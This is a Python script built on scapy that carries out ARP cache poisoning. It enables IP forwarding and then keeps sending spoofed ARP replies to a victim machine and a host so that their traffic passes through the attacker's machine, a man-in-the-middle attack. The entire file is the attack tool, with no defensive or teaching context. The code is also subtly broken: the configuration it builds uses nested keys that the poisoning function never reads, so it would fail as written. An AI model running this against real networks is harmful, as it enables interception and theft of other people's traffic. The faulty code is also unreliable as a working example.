#!/usr/bin/python3
import os
from argparse import ArgumentParser
from scapy.all import *

IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
TIMEOUT = 3
RETRY = 12

def configuration():
    parser = ArgumentParser()

    parser.add_argument('-t', dest='victim', required=True, type=str, help='The victim\'s IP address')
    parser.add_argument('-r',  dest='host', required=True, type=str, help='The host\'s IP address')
    parser.add_argument('-i',  dest='interface', required=True, type=str, help='Use this network interface')

    args = parser.parse_args()

    return {
        'victim' :  {

            'ip' : args.victim,
            'mac' : IPtoMAConvert(args.victim),
        },

        'host' :  {
            'ip' : args.host,
            'mac' : IPtoMAConvert(args.host),
        },

        'iface' : args.interface,
    }

def poisonExecute(configs):
    victimMac = configs['victimMac']
    hostMac = configs['hostMac']
    
    victimIP = configs['victimIP']
    hostIP = configs['hostIP']
 
    victimARP = ARP()
    host_arp = ARP()

    victimARP.op = 2
    host_arp.op = 2
    
    victimARP.hwdst = victimMac
    host_arp.hwdst = hostMac

    victimARP.pdst = victimIP
    host_arp.pdst = hostIP

    victimARP.psrc = hostIP
    host_arp.psrc = victimIP

    while True:
        try:
            print('Poisoning....')
            
            # send spoofed arp replies
            send(victimARP)
            send(host_arp)

            # wait for ARP replies from default GW or victim
            sniff(filter='arp and host %s or %s' %\
                        (hostIP, victimIP), count=1)

        # break out of loop if user hits ctrl+c
        except KeyboardInterrupt:
            break

    print('done!')

def IPtoMAConvert(ip, retry=RETRY, timeout=TIMEOUT):
    arp = ARP()
    arp.op = 1
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = ip
    response, unanswered = sr(arp, retry=retry, timeout=timeout)

    for s,r in response:
        return r[ARP].underlayer.src

    return None

def poison(configs):
    with open(IP_FORWARD, 'w') as fd:
        fd.write('1')
    poisonExecute(configs)

def main():
    configs = configuration()
    try:
        poison(configs)
    except KeyboardInterrupt:
        pass
    
main()
